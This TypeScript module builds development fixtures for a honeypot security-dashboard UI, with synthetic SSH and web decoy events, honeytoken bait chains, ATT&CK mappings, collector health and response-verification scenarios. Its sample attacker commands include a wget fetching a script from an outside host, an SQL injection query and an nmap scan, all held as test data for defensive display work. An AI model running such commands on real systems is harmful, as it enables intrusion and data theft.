/**
 * DEVELOPMENT FIXTURES in the PROPOSED evidence shape (./model.ts).
 *
 * Not captured data, not a contract, never on the demo path. This module is
 * imported only behind VITE_USE_FIXTURES=1, so a normal build drops it.
 * Every id starts with `dev_` and every run id with `run-dev-`, so a fixture
 * value can never be mistaken for a capture in a screenshot.
 *
 * Each scenario exercises one acceptance case from review section 19, so the
 * display components can be built and checked before Rohan's contract lands.
 * When it lands, these shapes should be regenerated from the agreed
 * contracts/examples rather than kept as a second source of truth (review
 * section 17: consume changed schemas, do not maintain a second detector).
 */

import type { CaptureMode, EventType, SensorId, SocEvent } from '../types/api';
import type {
  BaitChain,
  CandidateRelation,
  HealthView,
  MappingView,
  ParentInvestigation,
  ResponseEligibility,
  ResponseVerification,
  SessionCase,
  SourceProfile,
} from './model.ts';

export interface DevScenario {
  id: string;
  /** Review acceptance ids this scenario exercises. */
  review: string[];
  title: string;
  /** What a correct display must show, in one or two sentences. */
  expect: string;
  events: SocEvent[];
  profile?: SourceProfile;
  cases?: SessionCase[];
  relations?: CandidateRelation[];
  parents?: ParentInvestigation[];
  orphans?: BaitChain[];
  mappings?: MappingView[];
  health?: HealthView;
  verifications?: ResponseVerification[];
  eligibility?: Array<{ label: string; value: ResponseEligibility }>;
}

/** Builds every scenario with timestamps relative to `now`, so ages read correctly. */
export function buildDevScenarios(now: number = Date.now()): DevScenario[] {
  const at = (secondsAgo: number) => new Date(now - secondsAgo * 1000).toISOString();
  let seq = 9000;

  function event(
    id: string,
    sensor: SensorId,
    type: EventType,
    secondsAgo: number,
    extra: { session?: string | null; src?: string; mode?: CaptureMode; run?: string; attrs?: Record<string, unknown> } = {},
  ): SocEvent {
    seq += 1;
    return {
      schema_version: '1.0',
      source_record_id: `dev_rec_${id}`,
      sensor_id: sensor,
      event_type: type,
      occurred_at: at(secondsAgo),
      src_ip: extra.src ?? '192.168.77.10',
      session_id: extra.session ?? null,
      lab_run_id: extra.run ?? 'run-dev-01',
      capture_mode: extra.mode ?? 'live',
      attributes: extra.attrs ?? {},
      event_id: `dev_evt_${id}`,
      seq,
      ingested_at: at(secondsAgo),
      incident_id: null,
    };
  }

  /* ---- T01: two clients behind one address stay two cases ---- */
  const t01 = [
    event('a1', 'ssh-decoy-01', 'connection_open', 600, { session: 'dev_sA', attrs: { client_version: 'SSH-2.0-OpenSSH_9.6p1', observation_kind: 'network_input', outcome: 'attempted' } }),
    event('a2', 'ssh-decoy-01', 'auth_success', 598, { session: 'dev_sA', attrs: { username: 'dg_demo', observation_kind: 'emulated_result', outcome: 'emulated_success' } }),
    event('a3', 'ssh-decoy-01', 'command_input', 590, { session: 'dev_sA', attrs: { command: 'ls -la', observation_kind: 'command_input', outcome: 'attempted', channel_id: 'dev_ch_1' } }),
    event('b1', 'ssh-decoy-01', 'connection_open', 560, { session: 'dev_sB', attrs: { client_version: 'SSH-2.0-libssh_0.10.6', observation_kind: 'network_input', outcome: 'attempted' } }),
    event('b2', 'ssh-decoy-01', 'auth_failure', 559, { session: 'dev_sB', attrs: { username: 'backup', observation_kind: 'emulated_result', outcome: 'denied' } }),
    event('b3', 'ssh-decoy-01', 'auth_failure', 557, { session: 'dev_sB', attrs: { username: 'admin', observation_kind: 'emulated_result', outcome: 'denied' } }),
    event('w1', 'web-decoy-01', 'http_request', 300, { session: 'dev_wsA', attrs: { method: 'GET', path: '/', request_id: 'dev_req_1', user_agent: 'Mozilla/5.0 (X11; Linux x86_64)', observation_kind: 'network_input', outcome: 'attempted' } }),
  ];
  const t01Cases: SessionCase[] = [
    { case_id: 'dev_case_sA', basis: 'proposed_fixture', sensor_id: 'ssh-decoy-01', session_id: 'dev_sA', boundary: 'sensor_session', lab_run_id: 'run-dev-01', capture_mode: 'live', src_ip: '192.168.77.10', first_at: at(600), last_at: at(590), event_ids: ['dev_evt_a1', 'dev_evt_a2', 'dev_evt_a3'], outcomes: { attempted: 2, emulated_success: 1 }, request_ids: [], accounts: ['dg_demo'], commands: 1, rule_ids: ['R02', 'R03'], score: 50, severity: 'high' },
    { case_id: 'dev_case_sB', basis: 'proposed_fixture', sensor_id: 'ssh-decoy-01', session_id: 'dev_sB', boundary: 'sensor_session', lab_run_id: 'run-dev-01', capture_mode: 'live', src_ip: '192.168.77.10', first_at: at(560), last_at: at(557), event_ids: ['dev_evt_b1', 'dev_evt_b2', 'dev_evt_b3'], outcomes: { attempted: 1, denied: 2 }, request_ids: [], accounts: ['backup', 'admin'], commands: 0, rule_ids: [], score: 10, severity: 'low' },
    { case_id: 'dev_case_wsA', basis: 'proposed_fixture', sensor_id: 'web-decoy-01', session_id: 'dev_wsA', boundary: 'sensor_session', lab_run_id: 'run-dev-01', capture_mode: 'live', src_ip: '192.168.77.10', first_at: at(300), last_at: at(300), event_ids: ['dev_evt_w1'], outcomes: { attempted: 1 }, request_ids: ['dev_req_1'], accounts: [], commands: 0, rule_ids: [], score: 0, severity: 'low' },
  ];
  const t01Profile: SourceProfile = {
    profile_id: 'dev_profile_10', basis: 'proposed_fixture', src_ip: '192.168.77.10', lab_run_id: 'run-dev-01',
    capture_modes: ['live'], first_at: at(600), last_at: at(300),
    sensors: [{ sensor_id: 'ssh-decoy-01', cases: 2, events: 6 }, { sensor_id: 'web-decoy-01', cases: 1, events: 1 }],
    attempted_accounts: ['dg_demo', 'backup', 'admin'],
    client_claims: [
      { kind: 'ssh_client_version', value: 'SSH-2.0-OpenSSH_9.6p1', event_id: 'dev_evt_a1' },
      { kind: 'ssh_client_version', value: 'SSH-2.0-libssh_0.10.6', event_id: 'dev_evt_b1' },
      { kind: 'http_user_agent', value: 'Mozilla/5.0 (X11; Linux x86_64)', event_id: 'dev_evt_w1' },
    ],
    case_ids: t01Cases.map((c) => c.case_id),
    source_score: null,
  };
  const t01Relation: CandidateRelation = {
    relation_id: 'dev_rel_ip', basis: 'proposed_fixture', kind: 'candidate', status: 'open',
    reason: 'same src_ip within 5 min',
    from: { case_id: 'dev_case_sB', event_id: 'dev_evt_b3', sensor_id: 'ssh-decoy-01', at: at(557) },
    to: { case_id: 'dev_case_wsA', event_id: 'dev_evt_w1', sensor_id: 'web-decoy-01', at: at(300) },
    gap_seconds: 257, bait: null, decided_at: null, rationale: null, actor_id: null,
  };

  /* ---- T06: bait issued, served, presented, analyst-approved parent ---- */
  const t06 = [
    event('c1', 'ssh-decoy-01', 'command_input', 240, { session: 'dev_sC', attrs: { command: 'cat notes.txt', observation_kind: 'command_input', outcome: 'attempted' } }),
    event('c2', 'ssh-decoy-01', 'synthetic_file_access', 240, { session: 'dev_sC', attrs: { asset_id: 'staff_notes', issuance_id: 'dev_iss_7f2', observation_kind: 'emulated_result', outcome: 'emulated_success', digest_scope: 'full_sanitised_response' } }),
    event('d1', 'web-decoy-01', 'auth_success', 205, { session: 'dev_wsB', attrs: { username: 'svc_portal', honeytoken_id: 'tok_portal_01', request_id: 'dev_req_7', observation_kind: 'emulated_result', outcome: 'emulated_success' } }),
    event('d2', 'web-decoy-01', 'synthetic_file_access', 190, { session: 'dev_wsB', attrs: { asset_id: 'customer_data.csv', request_id: 'dev_req_9', observation_kind: 'emulated_result', outcome: 'emulated_success' } }),
  ];
  const t06Cases: SessionCase[] = [
    { case_id: 'dev_case_sC', basis: 'proposed_fixture', sensor_id: 'ssh-decoy-01', session_id: 'dev_sC', boundary: 'sensor_session', lab_run_id: 'run-dev-01', capture_mode: 'live', src_ip: '192.168.77.10', first_at: at(240), last_at: at(240), event_ids: ['dev_evt_c1', 'dev_evt_c2'], outcomes: { attempted: 1, emulated_success: 1 }, request_ids: [], accounts: ['dg_demo'], commands: 1, rule_ids: ['R02'], score: 40, severity: 'medium' },
    { case_id: 'dev_case_wsB', basis: 'proposed_fixture', sensor_id: 'web-decoy-01', session_id: 'dev_wsB', boundary: 'sensor_session', lab_run_id: 'run-dev-01', capture_mode: 'live', src_ip: '192.168.77.10', first_at: at(205), last_at: at(190), event_ids: ['dev_evt_d1', 'dev_evt_d2'], outcomes: { emulated_success: 2 }, request_ids: ['dev_req_7', 'dev_req_9'], accounts: ['svc_portal'], commands: 0, rule_ids: ['R09'], score: 30, severity: 'medium' },
  ];
  const t06Bait: BaitChain = {
    token_id: 'tok_portal_01', asset_id: 'staff_notes', issuance_id: 'dev_iss_7f2', fixture_version: 'bait-v2',
    issued: { session_id: 'dev_sC', sensor_id: 'ssh-decoy-01', at: at(240) },
    served: { event_id: 'dev_evt_c2', at: at(240), digest_scope: 'full_sanitised_response' },
    presented: { event_id: 'dev_evt_d1', sensor_id: 'web-decoy-01', at: at(205) },
    status: 'served_then_presented', v1_planted_side_event_id: null,
  };
  const t06Strong: CandidateRelation = {
    relation_id: 'dev_rel_tok', basis: 'proposed_fixture', kind: 'strong_candidate', status: 'confirmed',
    reason: 'honeytoken tok_portal_01 (issuance dev_iss_7f2)',
    from: { case_id: 'dev_case_sC', event_id: 'dev_evt_c2', sensor_id: 'ssh-decoy-01', at: at(240) },
    to: { case_id: 'dev_case_wsB', event_id: 'dev_evt_d1', sensor_id: 'web-decoy-01', at: at(205) },
    gap_seconds: 35, bait: t06Bait, decided_at: at(150),
    rationale: 'Credential issued to dev_sC was served there and presented on the portal 35 s later.',
    actor_id: 'analyst@lab.local',
  };
  const t06Rejected: CandidateRelation = {
    relation_id: 'dev_rel_rej', basis: 'proposed_fixture', kind: 'candidate', status: 'rejected',
    reason: 'same src_ip within 5 min',
    from: { case_id: 'dev_case_sB', event_id: 'dev_evt_b3', sensor_id: 'ssh-decoy-01', at: at(557) },
    to: { case_id: 'dev_case_wsB', event_id: 'dev_evt_d1', sensor_id: 'web-decoy-01', at: at(205) },
    gap_seconds: 352, bait: null, decided_at: at(140),
    rationale: 'Different client claim and no bait chain. Address alone is not enough.', actor_id: 'analyst@lab.local',
  };
  const t06Parent: ParentInvestigation = {
    parent_id: 'dev_parent_1', basis: 'proposed_fixture', relation_ids: ['dev_rel_tok'],
    case_ids: ['dev_case_sC', 'dev_case_wsB'], approved_at: at(150), approved_by: 'analyst@lab.local',
    rationale: t06Strong.rationale, score: 70, severity: 'high', incident_revision: 4, summary_stale: false,
  };

  /* ---- T05: token presented, nothing records it being served ---- */
  const t05 = [
    event('e1', 'web-decoy-01', 'auth_failure', 120, { session: 'dev_wsC', src: '192.168.77.11', attrs: { username: 'svc_portal', honeytoken_id: 'tok_portal_01', request_id: 'dev_req_12', observation_kind: 'emulated_result', outcome: 'denied' } }),
  ];
  const t05Orphan: BaitChain = {
    token_id: 'tok_portal_01', asset_id: null, issuance_id: null, fixture_version: null, issued: null, served: null,
    presented: { event_id: 'dev_evt_e1', sensor_id: 'web-decoy-01', at: at(120) },
    status: 'orphan_use', v1_planted_side_event_id: null,
  };

  /* ---- T07/T08/T10: outcomes and mapping rationale ---- */
  const t08 = [
    event('f1', 'ssh-decoy-01', 'command_input', 100, { session: 'dev_sD', attrs: { command: 'nmap -sV 10.0.0.0/24', observation_kind: 'emulated_result', outcome: 'failed' } }),
    event('f2', 'ssh-decoy-01', 'command_input', 98, { session: 'dev_sD', attrs: { command: 'wget http://198.51.100.7/x.sh', observation_kind: 'policy_result', outcome: 'denied' } }),
    event('f3', 'ssh-decoy-01', 'command_input', 96, { session: 'dev_sD', attrs: { command: 'echo "ls -la /etc"', observation_kind: 'command_input', outcome: 'unknown' } }),
    event('f4', 'web-decoy-01', 'http_request', 90, { session: 'dev_wsD', attrs: { method: 'GET', path: '/search', query_redacted: "q=x' UNION SELECT username FROM users--", request_id: 'dev_req_20', observation_kind: 'network_input', outcome: 'attempted' } }),
    event('f5', 'web-decoy-01', 'synthetic_file_access', 80, { session: 'dev_wsD', attrs: { asset_id: 'customer_data.csv', request_id: 'dev_req_21', observation_kind: 'emulated_result', outcome: 'emulated_success' } }),
  ];
  const t08Mappings: MappingView[] = [
    { finding_id: 'dev_fnd_r03', rule_id: 'R03', rule_version: '3', mapping_version: 'map-2', technique_ids: ['T1083'], technique_status: 'mapped', rationale: 'A parsed discovery command (ls) was submitted in an authenticated session. The quoted echo in dev_evt_f3 is literal text and was not counted.', limitation: 'An attempt in an emulated shell; not proof of discovery on a real host.', observation: 'observed', evidence_event_ids: ['dev_evt_a3'] },
    { finding_id: 'dev_fnd_r07', rule_id: 'R07', rule_version: '3', mapping_version: 'map-2', technique_ids: ['T1190'], technique_status: 'mapped', rationale: 'Injection structure in the /search input. A possible exploitation attempt; no execution was observed.', limitation: 'Successful exploitation is not established.', observation: 'inferred', evidence_event_ids: ['dev_evt_f4'] },
    { finding_id: 'dev_fnd_r04', rule_id: 'R04', rule_version: '3', mapping_version: 'map-2', technique_ids: [], technique_status: 'no_technique', rationale: 'Lure retrieval over the web is not automatically T1005 (data from local system). Recorded as lure access.', limitation: 'A synthetic file was served; no real data exists.', observation: 'observed', evidence_event_ids: ['dev_evt_f5'] },
  ];

  /* ---- T13: collector health separate from attacker activity ---- */
  const t13Health: HealthView = {
    basis: 'proposed_fixture',
    service: { backend: 'up', checked_at: at(2) },
    collectors: [
      { sensor_id: 'ssh-decoy-01', process_state: 'running', heartbeat_at: at(3), last_read_at: at(3), last_ingest_at: at(2400), backlog_records: 0, oldest_backlog_age_s: 0, error_count: 0, clock_skew_s: 312, ingest: { accepted: 412, duplicate: 3, rejected: 0, quarantined: 0, retry: 1 } },
      { sensor_id: 'web-decoy-01', process_state: 'stopped', heartbeat_at: at(95), last_read_at: at(95), last_ingest_at: at(96), backlog_records: 42, oldest_backlog_age_s: 88, error_count: 3, clock_skew_s: 0, ingest: { accepted: 220, duplicate: 0, rejected: 2, quarantined: 1, retry: 4 } },
    ],
    activity: [
      { sensor_id: 'ssh-decoy-01', last_event_at: at(2400) },
      { sensor_id: 'web-decoy-01', last_event_at: at(20) },
    ],
  };

  /* ---- T04/T15: verification by the full tuple, mismatches kept ---- */
  const t04: ResponseVerification[] = [
    {
      action_id: 'dev_act_01', basis: 'proposed_fixture', target_ip: '192.168.77.10', reason: 'demo containment', until: at(-60),
      committed: { at: at(60), policy_revision: 7, by: 'analyst@lab.local' },
      verified: { event_id: 'dev_evt_g4', at: at(30) }, ended: null,
      rejected_attempts: [
        { event_id: 'dev_evt_g1', at: at(50), sensor_id: 'ssh-decoy-01', src_ip: '192.168.77.10', capture_mode: 'live', reason: 'wrong_sensor' },
        { event_id: 'dev_evt_g2', at: at(45), sensor_id: 'web-decoy-01', src_ip: '192.168.77.11', capture_mode: 'live', reason: 'wrong_source' },
        { event_id: 'dev_evt_g3', at: at(40), sensor_id: 'web-decoy-01', src_ip: '192.168.77.10', capture_mode: 'replay', reason: 'replay_mode' },
      ],
    },
    {
      action_id: 'dev_act_02', basis: 'proposed_fixture', target_ip: '192.168.77.10', reason: 'second attempt', until: at(-90),
      committed: { at: at(30), policy_revision: 8, by: 'analyst@lab.local' }, verified: null, ended: null,
      rejected_attempts: [
        { event_id: 'dev_evt_g5', at: at(25), sensor_id: 'web-decoy-01', src_ip: '192.168.77.10', capture_mode: 'live', reason: 'stale_policy_revision' },
      ],
    },
    {
      action_id: 'dev_act_03', basis: 'proposed_fixture', target_ip: '192.168.77.10', reason: 'earlier run', until: at(700),
      committed: { at: at(820), policy_revision: 5, by: 'analyst@lab.local' }, verified: { event_id: 'dev_evt_g0', at: at(800) },
      ended: { kind: 'expired', at: at(700), by: null }, rejected_attempts: [],
    },
    {
      action_id: 'dev_act_04', basis: 'proposed_fixture', target_ip: '192.168.77.10', reason: 'undo test', until: at(400),
      committed: { at: at(500), policy_revision: 6, by: 'analyst@lab.local' }, verified: null,
      ended: { kind: 'revoked', at: at(480), by: 'analyst@lab.local' }, rejected_attempts: [],
    },
  ];

  /* ---- T03: replay cannot drive response ---- */
  const t03: Array<{ label: string; value: ResponseEligibility }> = [
    { label: 'Live source in an active run', value: { eligible: true, source: 'backend', reasons: [] } },
    {
      label: 'Replay-only source',
      value: {
        eligible: false, source: 'backend',
        reasons: [
          { code: 'replay_data', message: 'Every observation is replayed (ingest_namespace replay).' },
          { code: 'no_live_run', message: 'run-dev-replay is not the active live run.' },
        ],
      },
    },
    {
      label: 'Stale live observation',
      value: { eligible: false, source: 'backend', reasons: [{ code: 'stale_observation', message: 'No fresh matching observation from this source on web-decoy-01 in the last 5 min.' }] },
    },
  ];

  return [
    { id: 'two-clients', review: ['T01'], title: 'Two clients behind one address', expect: 'Two SSH session cases and a web case stay separate, each with its own score. The same-address relation stays open and uncertain; there is no combined critical incident.', events: t01, profile: t01Profile, cases: t01Cases, relations: [t01Relation] },
    { id: 'bait-chain', review: ['T06', 'T01'], title: 'Bait issued, served, presented, then approved', expect: 'The chain cites the issuance and the served event, not just a prior command. Only the confirmed relation forms the parent; the rejected one keeps both children and its reason.', events: [...t01, ...t06], cases: t06Cases, relations: [t06Strong, t06Rejected], parents: [t06Parent] },
    { id: 'orphan-token', review: ['T05'], title: 'Token presented without a bait read', expect: 'The use stays visible as an orphan observation. No read event and no relation are fabricated.', events: t05, orphans: [t05Orphan] },
    { id: 'outcomes', review: ['T07', 'T08', 'T10'], title: 'Outcomes and mapping rationale', expect: 'Failed, denied and unknown results are distinct from success. Lure retrieval carries no technique; R07 is an attempt, not execution.', events: [...t01, ...t08], mappings: t08Mappings },
    { id: 'health', review: ['T13'], title: 'Quiet healthy sensor, broken busy collector', expect: 'SSH is healthy though quiet for 40 min; web traffic is recent but its collector is stopped with a backlog. A future sensor clock never turns a collector healthy.', events: [], health: t13Health },
    { id: 'verification', review: ['T04', 'T15'], title: 'Verification by the full tuple', expect: 'Policy committed is not verification. Wrong-sensor, wrong-source, replay and stale-revision observations are rejected with reasons and do not change state.', events: [], verifications: t04 },
    { id: 'eligibility', review: ['T03'], title: 'Replay cannot drive response', expect: 'Ineligible sources show a disabled action with the backend reasons; the backend still decides on every request.', events: [], eligibility: t03 },
  ];
}
